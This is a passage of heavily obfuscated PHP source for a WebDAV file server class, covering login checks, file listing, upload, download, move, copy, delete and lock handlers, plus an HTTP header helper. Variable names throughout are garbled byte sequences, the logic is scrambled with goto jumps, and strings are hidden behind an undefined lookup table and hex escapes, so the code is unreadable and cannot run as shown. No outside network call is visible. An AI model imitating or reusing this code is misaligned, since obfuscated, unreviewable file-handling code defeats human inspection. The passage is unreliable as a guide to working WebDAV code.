B„ôÀƒ±§; fğ¨™à¡ˆ: } } class HttpDavServer { public function __construct($e†ëÃÍ‚¹³, $bçˆƒ¥¦ì) { $this->root = $e†ëÃÍ‚¹³; $this->initPath($bçˆƒ¥¦ì); $this->start(); } public function initPath($e¦¹âÜŒ¼ ) { $A¸›òÚÀâ =& $_SERVER[Î¿—”òá]; $aÄ°õ–ùå“ = rtrim($_SERVER[$A¸›òÚÀâ[1380]], $A¸›òÚÀâ[8]) . $A¸›òÚÀâ[8]; $this->urlBase = substr($aÄ°õ–ùå“, 0, strpos($aÄ°õ–ùå“, $e¦¹âÜŒ¼ ) + 1); $this->urlBase = rtrim($this->urlBase, $A¸›òÚÀâ[8]) . $e¦¹âÜŒ¼ ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $C‰¢·ªäÛÉ =& $_SERVER[Î¿—”òá]; $a¼Õº®Ù× = HttpAuth::get(); if ($a¼Õº®Ù×[$C‰¢·ªäÛÉ[535]] == $C‰¢·ªäÛÉ[1776] && $a¼Õº®Ù×[$C‰¢·ªäÛÉ[890]] == $C‰¢·ªäÛÉ[1777]) { return !0; } HttpAuth::error(); } public function start() { goto AŠœ·ÚåØ¦; D”óƒ×“Áñ: if (!method_exists($this, $eöÜ‡˜ö ²)) { pr($eöÜ‡˜ö ² . $aïŠ‰¼¼¤÷[1778]); die; } $bÔÀÉ—­ºç = array($aïŠ‰¼¼¤÷[1779], $aïŠ‰¼¼¤÷[1780]); if (!in_array($eöÜ‡˜ö ², $bÔÀÉ—­ºç) && !$this->pathExists($this->path)) { $EÑõ¼ĞñÊù = array($aïŠ‰¼¼¤÷[1025] => 404); } else { $EÑõ¼ĞñÊù = $this->{$eöÜ‡˜ö ²}(); } goto eáÇ¤ËŸ·Æ; AŠœ·ÚåØ¦: $aïŠ‰¼¼¤÷ =& $_SERVER[Î¿—”òá]; $this->checkUser(); $eöÜ‡˜ö ² = $aïŠ‰¼¼¤÷[144] . HttpHeader::method(); goto D”óƒ×“Áñ; eáÇ¤ËŸ·Æ: if (!$EÑõ¼ĞñÊù) { return; } self::response($EÑõ¼ĞñÊù); goto dÅ¬Ûßæ‡í; dÅ¬Ûßæ‡í: } public function pathGet($f¸Šš«© = false) { $BÉ‡î“¦‘ =& $_SERVER[Î¿—”òá]; $Cä½äÅ–ã¼ = $f¸Šš«© ? $_SERVER[$BÉ‡î“¦‘[1781]] : $_SERVER[$BÉ‡î“¦‘[1380]]; $Cä½äÅ–ã¼ = KodIO::clear(rawurldecode($Cä½äÅ–ã¼)); if (!strstr($Cä½äÅ–ã¼, KodIO::clear($this->urlBase))) { return !1; } return substr($Cä½äÅ–ã¼, strpos($Cä½äÅ–ã¼, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($eÅÎâëœ„Ù) { return file_exists($eÅÎâëœ„Ù); } public function pathMkdir($cÃÕ‚‡ÖŞ“) { return mkdir($cÃÕ‚‡ÖŞ“, 511, !0); } public function pathInfo($cÆ’ÜÒ‚Æ–) { return path_info($cÆ’ÜÒ‚Æ–); } public function pathList($DİÅÙëÄßÚ) { return path_list($DİÅÙëÄßÚ); } public function pathOut($bÍğ©Ğ‹­²) { echo file_get_contents($bÍğ©Ğ‹­²); } public function pathPut($f§½å¶œ±È, $fï‹´Šª†Ş = '') { if (!$fï‹´Šª†Ş) { return file_put_contents($f§½å¶œ±È, $_SERVER[Î¿—”òá][33]); } return move_path($fï‹´Šª†Ş, $f§½å¶œ±È); } public function pathRemove($e‹¡ˆÅñ°í) { if (is_file($e‹¡ˆÅñ°í)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($EŠ«Õ‰ëœó, $aàÀ™õß£) { return move_path($EŠ«Õ‰ëœó, $aàÀ™õß£); } public function pathCopy($B­ô£Ú£¾Œ, $C‡˜·Ì½Ÿ) { return copy_dir($B­ô£Ú£¾Œ, $C‡˜·Ì½Ÿ); } public function parsePath($B§²ÆÓß‹¿) { return $B§²ÆÓß‹¿; } public function parseItem($d”ŒÈ¼ÄŒØ, $c³éğ•ÕºÙ) { goto BŒ°¨ßší; f¤Õó¢Õ°Å: $bŒ†¬Ÿ¶³ß = array($F”øÏ“‡Ö”[1782] => KodIO::clear($this->urlBase . $f¥–Î‡è–), $F”øÏ“‡Ö”[107] => @gmdate($F”øÏ“‡Ö”[1783], $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[107]]), $F”øÏ“‡Ö”[187] => @gmdate($F”øÏ“‡Ö”[1784], $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[187]]), $F”øÏ“‡Ö”[77] => $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[77]] ? $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[77]] : 0); return $bŒ†¬Ÿ¶³ß; goto Få­¬àó±¤; BŒ°¨ßší: $F”øÏ“‡Ö” =& $_SERVER[Î¿—”òá]; $f¥–Î‡è– = $this->pathGet() . $F”øÏ“‡Ö”[8] . $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[28]]; $f¥–Î‡è– = $F”øÏ“‡Ö”[8] . str_replace($F”øÏ“‡Ö”[172], $F”øÏ“‡Ö”[8], rawurlencode($f¥–Î‡è–)); goto Dâñˆ‘Íï; Dâñˆ‘Íï: if ($c³éğ•ÕºÙ) { $f¥–Î‡è– = $F”øÏ“‡Ö”[8] . str_replace($F”øÏ“‡Ö”[172], $F”øÏ“‡Ö”[8], rawurlencode($this->pathGet())); } if (!trim($d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[107]])) { $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[107]] = time(); } if (!trim($d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[187]])) { $d”ŒÈ¼ÄŒØ[$F”øÏ“‡Ö”[187]] = time(); } goto f¤Õó¢Õ°Å; Få­¬àó±¤: } public function parseItemXml($aÁ§ÓÉ»Ğã, $fØµ¹˜Û²ß) { $E“ó·î¢á¦ =& $_SERVER[Î¿—”òá]; $câ®ŞÊ¥Ğ¾ = $this->parseItem($aÁ§ÓÉ»Ğã, $fØµ¹˜Û²ß); if ($aÁ§ÓÉ»Ğã[$E“ó·î¢á¦[29]] == $E“ó·î¢á¦[76]) { $e¼„†²ËŸî = $E“ó·î¢á¦[1785]; $e¼„†²ËŸî .= $E“ó·î¢á¦[1786]; } else { $D’Ğ°Å§ï = $aÁ§ÓÉ»Ğã[$E“ó·î¢á¦[160]] ? $aÁ§ÓÉ»Ğã[$E“ó·î¢á¦[160]] : get_path_ext($aÁ§ÓÉ»Ğã[$E“ó·î¢á¦[28]]); $aŒ™ˆ…„Ø— = get_file_mime($D’Ğ°Å§ï); $e¼„†²ËŸî = $E“ó·î¢á¦[1787]; $e¼„†²ËŸî .= "\x3c\x44\x3a\x67\145\164\x63\x6f\x6e\x74\145\156\164\x74\x79\x70\145\76{$aŒ™ˆ…„Ø—}\x3c\x2f\x44\72\147\145\164\143\157\x6e\164\x65\x6e\x74\164\x79\160\x65\76"; } return "\12\x9\11\74\104\x3a\162\145\163\x70\x6f\x6e\x73\x65\76\12\x9\11\x9\74\x44\x3a\150\x72\145\146\76{$câ®ŞÊ¥Ğ¾[$E“ó·î¢á¦[1782]]}\74\x2f\x44\x3a\150\x72\145\146\x3e\12\x9\x9\x9\x3c\104\72\x70\x72\157\x70\163\164\x61\164\76\xa\x9\x9\11\x9\74\104\72\160\x72\x6f\x70\x3e\12\11\x9\x9\x9\x9\x3c\x44\72\x67\x65\x74\x6c\141\163\164\x6d\x6f\144\151\146\x69\x65\144\76{$câ®ŞÊ¥Ğ¾[$E“ó·î¢á¦[107]]}\x3c\x2f\104\x3a\147\x65\164\154\x61\x73\164\x6d\157\x64\151\146\x69\145\144\x3e\12\x9\x9\11\x9\x9\x3c\104\72\143\x72\x65\x61\x74\151\157\x6e\x64\x61\164\x65\76{$câ®ŞÊ¥Ğ¾[$E“ó·î¢á¦[187]]}\74\x2f\104\72\143\162\x65\141\164\151\x6f\156\x64\141\164\x65\76\xa\x9\11\x9\x9\x9\x3c\104\x3a\147\x65\164\143\x6f\156\x74\145\x6e\x74\x6c\x65\156\x67\164\150\76{$câ®ŞÊ¥Ğ¾[$E“ó·î¢á¦[77]]}\x3c\x2f\104\72\147\x65\164\143\157\x6e\x74\145\x6e\x74\154\x65\x6e\x67\x74\150\76\12\11\11\x9\11\x9{$e¼„†²ËŸî}\xa\x9\11\x9\x9\74\x2f\104\72\x70\162\x6f\x70\76\12\x9\11\11\x9\x3c\x44\x3a\x73\164\141\x74\165\x73\76\x48\x54\x54\x50\57\61\56\61\x20\62\x30\60\40\117\113\74\x2f\104\x3a\x73\x74\141\x74\x75\163\x3e\12\x9\11\11\x3c\x2f\x44\x3a\x70\x72\157\160\x73\x74\x61\x74\x3e\12\11\11\74\x2f\x44\72\162\145\x73\x70\157\156\163\x65\76"; } public function pathListMerge($fºÛÛ™ÌŸì) { goto b¤â‹±¡ì ; c¸”õ’ÒÂ‡: $d‘àªÛª‚Ü = array(); foreach ($fºÛÛ™ÌŸì as $e„‚ ¯œ»Ï => $C†ÃÜï£å‹) { if (!in_array($e„‚ ¯œ»Ï, $EõÊµÂëÓ) || !is_array($C†ÃÜï£å‹)) { continue; } $d‘àªÛª‚Ü = array_merge($d‘àªÛª‚Ü, $C†ÃÜï£å‹); } foreach ($d‘àªÛª‚Ü as &$AÍ•ÏŠº¿Ê) { $AÍ•ÏŠº¿Ê[$B™Æˆš¿±ª[28]] = str_replace($B™Æˆš¿±ª[8], $B™Æˆš¿±ª[1382], $AÍ•ÏŠº¿Ê[$B™Æˆš¿±ª[28]]); } goto a¼ŞÄŸë÷; a¼ŞÄŸë÷: return $d‘àªÛª‚Ü; goto EÛ®õÔ‹ˆæ; b¤â‹±¡ì : $B™Æˆš¿±ª =& $_SERVER[Î¿—”òá]; if (!$fºÛÛ™ÌŸì) { return $fºÛÛ™ÌŸì; } $EõÊµÂëÓ = array($B™Æˆš¿±ª[73], $B™Æˆš¿±ª[74], $B™Æˆš¿±ª[1788]); goto c¸”õ’ÒÂ‡; EÛ®õÔ‹ˆæ: } public function httpPROPFIND() { goto f¿³äÊ¿; A°•…àÓéñ: $a¬é…Ì…Àö = $EÎ¡Š¤”Á‹[$BØŞÛ°øæŞ[1789]]; if (!is_array($eÏâĞùƒ) || $a¬é…Ì…Àö[$BØŞÛ°øæŞ[1790]] === !1) { return array($BØŞÛ°øæŞ[1791] => 404, $BØŞÛ°øæŞ[1792] => $BØŞÛ°øæŞ[1793]); } $f¥Ôò±ÏË‹ = $a¬é…Ì…Àö[$BØŞÛ°øæŞ[29]] == $BØŞÛ°øæŞ[167] || HttpHeader::get($BØŞÛ°øæŞ[1768]) == $BØŞÛ°øæŞ[468]; goto AÎµğ²Ÿâ; BÄ‡ÕÑÙÃ: return array($BØŞÛ°øæŞ[1791] => 207, $BØŞÛ°øæŞ[1792] => "\74\104\72\x6d\x75\x6c\164\151\x73\x74\x61\164\x75\163\40\170\155\154\x6e\163\72\x44\75\42\104\101\126\72\42\76\xa{$b¨âÅ­æ±è}\xa\x3c\x2f\104\x3a\155\165\x6c\164\x69\163\x74\141\x74\165\x73\x3e"); goto a‘¤³Œ†ÚÙ; f¿³äÊ¿: $BØŞÛ°øæŞ =& $_SERVER[Î¿—”òá]; $EÎ¡Š¤”Á‹ = $this->pathList($this->path); $eÏâĞùƒ = $this->pathListMerge($EÎ¡Š¤”Á‹); goto A°•…àÓéñ; AÎµğ²Ÿâ: if ($f¥Ôò±ÏË‹) { $eÏâĞùƒ = array($a¬é…Ì…Àö); } else { $a¬é…Ì…Àö[$BØŞÛ°øæŞ[28]] = $BØŞÛ°øæŞ[33]; $eÏâĞùƒ = array_merge(array($a¬é…Ì…Àö), $eÏâĞùƒ); } $b¨âÅ­æ±è = $BØŞÛ°øæŞ[33]; foreach ($eÏâĞùƒ as $fŞ’Æ†Ø‚¤) { $b¨âÅ­æ±è .= $this->parseItemXml($fŞ’Æ†Ø‚¤, $f¥Ôò±ÏË‹); } goto BÄ‡ÕÑÙÃ; a‘¤³Œ†ÚÙ: } public function httpHEAD() { $dãÛŠ§æí‚ =& $_SERVER[Î¿—”òá]; $DÔ—ÁàŞ = $this->pathInfo($this->path); if (!$DÔ—ÁàŞ || $DÔ—ÁàŞ[$dãÛŠ§æí‚[29]] == $dãÛŠ§æí‚[76]) { return array($dãÛŠ§æí‚[1025] => 200, $dãÛŠ§æí‚[1200] => array($dãÛŠ§æí‚[1794])); } return array($dãÛŠ§æí‚[1025] => 200, $dãÛŠ§æí‚[1200] => array($dãÛŠ§æí‚[1795], $dãÛŠ§æí‚[136], $dãÛŠ§æí‚[1796] . $DÔ—ÁàŞ[$dãÛŠ§æí‚[77]], $dãÛŠ§æí‚[1797] . get_file_mime($DÔ—ÁàŞ[$dãÛŠ§æí‚[160]]), $dãÛŠ§æí‚[132] . gmdate($dãÛŠ§æí‚[1783], $DÔ—ÁàŞ[$dãÛŠ§æí‚[1247]]) . $dãÛŠ§æí‚[1798], $dãÛŠ§æí‚[1799])); } public function httpOPTIONS() { $a…ÚÊ³¶ĞË =& $_SERVER[Î¿—”òá]; return array($a…ÚÊ³¶ĞË[1025] => 200, $a…ÚÊ³¶ĞË[1200] => array($a…ÚÊ³¶ĞË[1800], $a…ÚÊ³¶ĞË[1801], $a…ÚÊ³¶ĞË[1802], $a…ÚÊ³¶ĞË[1256])); } public function httpPROPPATCH() { $BÅ± ‹³ó– =& $_SERVER[Î¿—”òá]; $E“ª°”½³® = $BÅ± ‹³ó–[1803] . $_SERVER[$BÅ± ‹³ó–[1380]] . $BÅ± ‹³ó–[1804]; return array($BÅ± ‹³ó–[1791] => 207, $BÅ± ‹³ó–[1792] => "\74\x44\72\155\165\154\x74\151\163\164\x61\x74\165\163\x20\170\x6d\x6c\x6e\x73\72\104\x3d\x22\104\101\x56\x3a\42\x3e\xa{$E“ª°”½³®}\xa\x3c\x2f\x44\72\x6d\165\154\164\151\x73\164\141\x74\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $CŞ‘Ÿ«¨‚Á =& $_SERVER[Î¿—”òá]; $Bµ¢ÎÈŠí» = $this->uploadFile(); if ($Bµ¢ÎÈŠí») { $EÀÌ“›ğÏ = 204; } else { $Bµ¢ÎÈŠí» = $CŞ‘Ÿ«¨‚Á[33]; $EÀÌ“›ğÏ = 201; } $AÍ¯©Ş‡à‡ = $this->pathPut($this->path, $Bµ¢ÎÈŠí»); if ($AÍ¯©Ş‡à‡ == !1) { $EÀÌ“›ğÏ = 404; } return array($CŞ‘Ÿ«¨‚Á[1791] => $EÀÌ“›ğÏ); } private function uploadFile() { goto AøÈ‡Û§Å; e‡‘Ï«Û°: while (!feof($dÅ¡÷¤óö±)) { fwrite($eÚ¸ó‚ß²Ñ, fread($dÅ¡÷¤óö±, 1024 * 200)); } fclose($dÅ¡÷¤óö±); fclose($eÚ¸ó‚ß²Ñ); goto BéªÄÔç; D—ò¾¬ğ‘Ö: $eÚ¸ó‚ß²Ñ = @fopen($CĞ²‰šµ‘, $CÂÛÈ¯‚¤¾[1514]); $dÅ¡÷¤óö± = @fopen($CÂÛÈ¯‚¤¾[1806], $CÂÛÈ¯‚¤¾[1513]); if (!$dÅ¡÷¤óö± || !$eÚ¸ó‚ß²Ñ) { @unlink($CĞ²‰šµ‘); return !1; } goto e‡‘Ï«Û°; AøÈ‡Û§Å: $CÂÛÈ¯‚¤¾ =& $_SERVER[Î¿—”òá]; @mk_dir(TEMP_FILES); $CĞ²‰šµ‘ = TEMP_FILES . $CÂÛÈ¯‚¤¾[1805] . rand_string(32); goto D—ò¾¬ğ‘Ö; BéªÄÔç: if (@filesize($CĞ²‰šµ‘) > 0) { return $CĞ²‰šµ‘; } @unlink($CĞ²‰šµ‘); return !1; goto Bºƒ„“ÎŠÂ; Bºƒ„“ÎŠÂ: } public function httpMKCOL() { $c‰ƒÍÇ  =& $_SERVER[Î¿—”òá]; if ($this->pathExists($this->path)) { return array($c‰ƒÍÇ [1025] => 409); } $cæí¤áÖºÈ = $this->pathMkdir($this->path); return array($c‰ƒÍÇ [1025] => $cæí¤áÖºÈ ? 201 : 403); } public function httpMOVE() { $aÍŠ‚å³“Ï =& $_SERVER[Î¿—”òá]; $AŠÏÅ‘º…£ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$aÍŠ‚å³“Ï[1807]])) { $fó…‚ïÇ¦¸[$aÍŠ‚å³“Ï[1808]] = $_SERVER[$aÍŠ‚å³“Ï[1807]] == $aÍŠ‚å³“Ï[1809]; } $D£Éí«ø½ = $this->pathMove($this->path, $AŠÏÅ‘º…£); return array($aÍŠ‚å³“Ï[1025] => $D£Éí«ø½ ? 201 : 404); } public function httpCOPY() { $Fä—Éùò‰ò = $this->parsePath($this->pathGet(!0)); $Bš‘“‘É´§ = $this->pathCopy($this->path, $Fä—Éùò‰ò); return array($_SERVER[Î¿—”òá][1025] => $Bš‘“‘É´§ ? 201 : 404); } public function httpDELETE() { $cÏÔ†ò = $this->pathRemove($this->path); return array($_SERVER[Î¿—”òá][1025] => $cÏÔ†ò ? 200 : 503); } public function httpLOCK() { $a¿»¢ª£è =& $_SERVER[Î¿—”òá]; $C©ÅŞœ¿°— = md5($this->path); $c·ƒ¾®ê¯ = $a¿»¢ª£è[1810] . $this->xmlGet($a¿»¢ª£è[1811]) . $a¿»¢ª£è[1812] . $C©ÅŞœ¿°— . $a¿»¢ª£è[1813]; return array($a¿»¢ª£è[1025] => 200, $a¿»¢ª£è[1200] => array($a¿»¢ª£è[1814] . $C©ÅŞœ¿°—, $a¿»¢ª£è[1815]), $a¿»¢ª£è[1816] => $c·ƒ¾®ê¯); } public function httpUNLOCK() { return array($_SERVER[Î¿—”òá][1025] => 204); } public function xmlGet($FõËÓÖñ¡Ü) { goto f‘ˆ¬¡ì›ä; f‘ˆ¬¡ì›ä: $E½ó‹¦îÑ© =& $_SERVER[Î¿—”òá]; static $DÑÊÒ©²’´ = false; if (!$DÑÊÒ©²’´) { $eŒÎ…£†ô = file_get_contents($E½ó‹¦îÑ©[1817]); $DÑÊÒ©²’´ = new DOMDocument(); $DÑÊÒ©²’´->loadXML($eŒÎ…£†ô); } goto Cˆî´ãÁâµ; Cˆî´ãÁâµ: $A¢Ñíà‰ÛÀ = array_shift(explode($E½ó‹¦îÑ©[8], $FõËÓÖñ¡Ü)); $f³ã¬ù£™² = $DÑÊÒ©²’´->getElementsByTagNameNS($E½ó‹¦îÑ©[1818], $A¢Ñíà‰ÛÀ); if ($f³ã¬ù£™²) { return $f³ã¬ù£™²[0]->nodeValue; } goto f‰îòÇ«ç; f‰îòÇ«ç: return $E½ó‹¦îÑ©[33]; goto D’ñ—›ŸÅ; D’ñ—›ŸÅ: } public static function response($BÈ¯º÷‡Öù) { goto Cë¿¿Õ°Ÿ; b•‚–ª¼—–: $e§»³µÚ»”[] = $F©½ùèŠ[1758]; $e§»³µÚ»”[] = $F©½ùèŠ[1759]; foreach ($e§»³µÚ»” as $AÉÚŠŒÌ) { header($AÉÚŠŒÌ); } goto eœÅªáîºø; Cë¿¿Õ°Ÿ: $F©½ùèŠ =& $_SERVER[Î¿—”òá]; $e§»³µÚ»” = is_array($BÈ¯º÷‡Öù[$F©½ùèŠ[1200]]) ? $BÈ¯º÷‡Öù[$F©½ùèŠ[1200]] : array(); $e§»³µÚ»”[] = HttpHeader::code($BÈ¯º÷‡Öù[$F©½ùèŠ[1025]]); goto b•‚–ª¼—–; eœÅªáîºø: if (is_string($BÈ¯º÷‡Öù[$F©½ùèŠ[1816]])) { header($F©½ùèŠ[1819]); $AíÒÕŸ‘µÄ = $F©½ùèŠ[1820] . $F©½ùèŠ[217] . $BÈ¯º÷‡Öù[$F©½ùèŠ[1816]]; echo $AíÒÕŸ‘µÄ; } goto dÇæ¦£¿µ; dÇæ¦£¿µ: } } class HttpHeader { public static $_headers = array("\x48\x6f\x73\164" => "\x48\x54\x54\x50\137\110\x4f\123\124", "\x55\x73\x65\162\x2d\101\x67\145\156\x74" => "\110\124\x54\120\137\125\x53\105\x52\x5f\x41\x47\105\116\124", "\103\157\x6e\164\145\156\x74\x2d\x54\171\x70\145" => "\x48\124\124\x50\137\103\x4f\x4e\x54\105\x4e\x54\137\x54\131\x50\105", "\x43\157\156\164\x65\156\164\55\x4c\145\156\x67\x74\x68" => "\x48\124\124\x50\x5f\103\x4f\116\x54\x45\x4e\124\137\x4c\x45\x4e\107\x54\110", "\x44\x65\x70\164\150" => "\x48\x54\124\x50\137\104\105\120\124\110", "\105\170\160\145\143\164" => "\110\124\x54\x50\x5f\x45\130\x50\x45\103\124", "\111\x66\55\116\x6f\x6e\145\x2d\x4d\141\x74\x63\150" => "\x48\124\124\x50\137\x49\106\x5f\x4e\117\x4e\x45\137\x4d\x41\124\103\110", "\x49\x66\x2d\115\x61\x74\x63\x68" => "\x48\124\124\120\x5f\111\106\137\115\x41\124\x43\x48", "\111\x66\x2d\122\141\156\147\x65" => "\110\124\x54\x50\x5f\111\x46\137\x52\101\116\107\105", "\x4c\141\x73\164\55\x4d\x6f\144\151\x66\151\145\x64" => "\110\x54\124\x50\x5f\x4c\x41\x53\124\137\x4d\x4f\104\111\x46\111\x45\x44", "\x49\x66\x2d\115\x6f\x64\151\x66\151\x65\x64\55\123\151\x6e\143\x65" => "\110\124\x54\x50\137\x49\x46\x5f\x4d\117\x44\x49\106\111\105\104\x5f\123\111\116\103\105", "\x49\146\55\x55\156\x6d\x6f\x64\151\146\x69\x65\x64\55\x53\x69\x6e\143\x65" => "\110\x54\124\120\137\111\106\x5f\x55\116\x4d\x4f\x44\111\106\x49\105\x44\x5f\123\x49\x4e\103\x45", "\x52\141\156\147\145" => "\110\x54\124\120\137\x52\101\x4e\x47\105", "\124\151\155\x65\x6f\165\164" => "\x48\124\x54\x50\137\124\x49\x4d\x45\117\x55\x54", "\111\x66" => "\x48\x54\x54\120\x5f\x49\106", "\x4c\x6f\x63\x6b\55\x54\x6f\153\145\x6e" => "\110\124\124\x50\x5f\114\117\103\x4b\x5f\x54\117\113\105\x4e", "\117\166\145\x72\x77\162\151\164\x65" => "\110\x54\x54\x50\137\117\x56\x45\x52\127\122\111\x54\x45", "\x44\x65\x73\164\151\x6e\x61\x74\151\x6f\x6e" => "\x48\x54\x54\x50\137\x44\x45\123\124\111\116\101\x54\x49\117\x4e", "\x52\x65\x71\165\145\163\x74\x2d\x49\144" => "\122\x45\x51\x55\x45\x53\x54\137\x49\x44", "\122\145\161\x75\145\x73\x74\x2d\x42\x6f\x64\x79\55\106\151\x6c\x65" => "\x52\x45\x51\x55\x45\123\124\x5f\102\117\104\131\x5f\106\x49\x4c\x45", "\122\145\x64\151\162\145\x63\164\x2d\x53\x74\x61\164\165\x73" => "\122\x45\x44\111\x52\x45\x43\x54\x5f\x53\124\x41\x54\125\123"); public static function init() { static $a‚ø¯‘í“ = false; if ($a‚ø¯‘í“) { return; } foreach ($_SERVER as $dË ‚Ö÷È => $b˜Å—†¾†ö) { $dË ‚Ö÷È = strtoupper($dË ‚Ö÷È); if (!array_key_exists($dË ‚Ö÷È, $_SERVER)) { continue; } $_SERVER[$dË ‚Ö÷È] = $b˜Å—†¾†ö; } foreach (self::$_headers as $dË ‚Ö÷È => $bó”Ú¸õê‰) { if (!array_key_exists($dË ‚Ö÷È, $_SERVER)) { continue; } $_SERVER[$dË ‚Ö÷È] = $_SERVER[$bó”Ú¸õê‰]; $_SERVER[strtoupper($dË ‚Ö÷È)] = $_SERVER[$bó”Ú¸õê‰]; } } public static function get($E«Å¸¼çöÄ) { self::init(); return $_SERVER[$E«Å¸¼çöÄ] ? $_SERVER[$E«Å¸¼çöÄ] : $_SERVER[$_SERVER[Î¿—”òá][1821] . strtoupper($E«Å¸¼çöÄ)]; } public static function method() { return strtoupper(self::get($_SERVER[Î¿—”òá][154])); } public static function length() { $aó‰²µ›ÃÖ =& $_SERVER[Î¿—”òá]; $AÕ¤òÀˆ£´ = self::get($aó‰²µ›ÃÖ[1822]); if (!$AÕ¤òÀˆ£´) { $AÕ¤òÀˆ£´ = self::get($aó‰²µ›ÃÖ[1139]); } return $AÕ¤òÀˆ£´; } public static function range() { $Dêõ©â™É =& $_SERVER[Î¿—”òá]; $E–ñïì¤ = self::get($Dêõ©â™É[198]); if (!$E–ñïì¤) { return !1; } if (!preg_match($Dêõ©â™É[1823], $E–ñïì¤, $e›…ôõãò)) { return !1; } if ($e›…ôõãò[1] === $Dêõ©â™É[33] && $e›…ôõãò[2] === $Dêõ©â™É[33]) { return !1; } return array($e›…ôõãò[1] !== $Dêõ©â™É[33] ? $e›…ôõãò[1] : null, $e›…ôõãò[2] !== $Dêõ©â™É[33] ? $e›…ôõãò[2] : null); } public static $statusCode = array("\x31\x30\60" => "\103\157\x6e\x74\x69\x6e\x75\145", "\x31\60\x31" => "\123\167\151\164\x63\150\151\156\x67\x20\120\x72\157\164\157\x63\157\154", "\61\60\62" => "\x50\162\157\143\x65\163\163\x69\x6e\x67", "\x31\x30\x33" => "\x45\x61\162\x6c\171\x20\x48\151\156\x74\x73", "\62\x30\60" => "\x4f\x4b", "\62\60\x31" => "\103\162\145\141\x74\145\144", "\x32\x30\x32" => "\x41\x63\x63\145\160\164\x65\x64", "\62\60\63" => "\116\157\x6e\55\101\165\164\x68\157\x72\151\164\141\x74\x69\x76\145\40\x49\x6e\146\157\x72\x6d\141\x74\x69\x6f\x6e", "\x32\x30\64" => "\x4e\x6f\x20\x43\x6f\156\x74\145\x6e\164", "\62\x30\65" => "\x52\145\x73\x65\x74\40\103\157\156\x74\145\x6e\x74", "\x32\x30\66" => "\x50\141\162\x74\x69\x61\154\x20\103\157\x6e\164\145\x6e\164", "\x32\x30\x37" => "\115\165\154\164\x69\55\x53\x74\x61\x74\165\x73", "\63\x30\x30" => "\115\165\154\x74\x69\160\x6c\145\x20\x43\x68\157\151\x63\145\163", "\x33\60\61" => "\x4d\157\166\x65\144\x20\x50\145\162\155\x61\x6e\145\x6e\x74\x6c\x79", "\x33\60\x32" => "\x46\157\165\x6e\144", "\x33\x30\x33" => "\123\x65\145\40\117\164\150\145\x72", "\x33\60\x34" => "\x4e\x6f\x74\x20\x4d\x6f\x64\x69\x66\x69\145\x64", "\x33\60\x35" => "\125\163\145\x20\120\x72\x6f\170\171", "\63\60\67" => "\x54\145\155\160\x6f\x72\x61\x72\x79\40\x52\145\x64\151\162\145\143\164", "\x33\60\70" => "\x50\145\x72\155\x61\156\x65\156\164\x20\x52\145\144\x69\x72\x65\143\x74", "\x34\x30\60" => "\x42\x61\144\x20\x52\145\x71\x75\145\163\164", "\64\x30\x31" => "\125\x6e\x61\165\x74\x68\x6f\162\x69\172\x65\x64", "\x34\60\62" => "\120\141\171\x6d\145\156\x74\40\x52\145\161\x75\151\162\145\144", "\x34\x30\63" => "\x46\x6f\x72\142\151\x64\144\x65\x6e", "\64\60\x34" => "\x4e\x6f\164\x20\x46\157\x75\156\144", "\64\60\65" => "\x4d\145\x74\150\x6f\144\40\116\157\x74\x20\x41\x6c\154\x6f\x77\145\144", "\64\60\x36" => "\116\x6f\x74\40\x41\143\x63\x65\x70\x74\x61\x62\154\x65", "\x34\60\67" => "\x50\x72\157\x78\x79\40\x41\165\x74\150\145\156\164\x69\143\141\164\151\157\x6e\40\x52\145\161\x75\151\162\145\144", "\64\60\x38" => "\122\145\x71\x75\145\x73\164\x20\x54\x69\155\145\x6f\165\x74", "\x34\x30\x39" => "\x43\157\156\146\x6c\x69\x63\164", "\x34\x31\x30" => "\107\x6f\x6e\145", "\64\61\61" => "\114\145\156\147\164\x68\40\122\145\161\165\x69\162\145\144", "\x34\61\62" => "\120\162\x65\143\x6f\156\144\151\164\151\157\x6e\40\106\141\x69\x6c\x65\144", "\64\61\x33" => "\x52\145\x71\x75\x65\x73\164\x20\x45\156\x74\x69\164\171\40\124\x6f\x6f\40\x4c\141\x72\147\x65", "\64\x31\64" => "\122\145\x71\x75\145\163\x74\40\x55\122\x49\40\124\157\157\40\x4c\x61\162\x67\145", "\x34\61\x35" => "\x55\x6e\163\165\x70\x70\x6f\162\x74\x65\144\40\x4d\145\x64\151\141\x20\x54\171\x70\145", "\x34\61\66" => "\x52\145\161\165\x65\163\164\145\x64\40\x52\141\x6e\147\145\40\x4e\x6f\164\40\123\x61\x74\151\163\146\x69\x61\142\154\x65", "\64\61\x37" => "\105\x78\x70\145\x63\x74\141\x74\151\157\x6e\40\106\141\x69\x6c\145\144", "\x34\x32\62" => "\125\156\x70\162\157\143\x65\x73\163\141\x62\x6c\x65\x20\x45\156\x74\x69\x74\x79", "\64\x32\63" => "\114\157\x63\153\x65\144", "\64\x32\64" => "\106\x61\x69\x6c\x65\x64\x20\104\145\x70\145\x6e\144\145\x6e\x63\x79", "\x34\62\x35" => "\x55\156\157\162\144\145\x72\145\x64\40\x43\x6f\x6c\154\145\143\164\151\x6f\x6e", "\x34\62\x36" => "\x55\x70\147\x72\x61\144\145\x20\x52\x65\161\x75\151\x72\145\x64", "\x34\x32\70" => "\120\x72\145\143\x6f\x6e\144\151\x74\151\x6f\x6e\40\x52\145\x71\165\151\162\145\144", "\x34\62\x39" => "\x54\x6f\x6f\x20\x4d\x61\156\171\40\x52\x65\161\165\x65\x73\164\163", "\64\63\x31" => "\122\145\x71\165\x65\163\x74\x20\x48\x65\x61\144\145\162\40\x46\151\x65\x6c\144\163\40\x54\157\x6f\40\114\x61\162\147\x65", "\x34\x34\64" => "\116\x6f\40\x52\145\x73\x70\157\x6e\x73\145", "\64\x35\x30" => 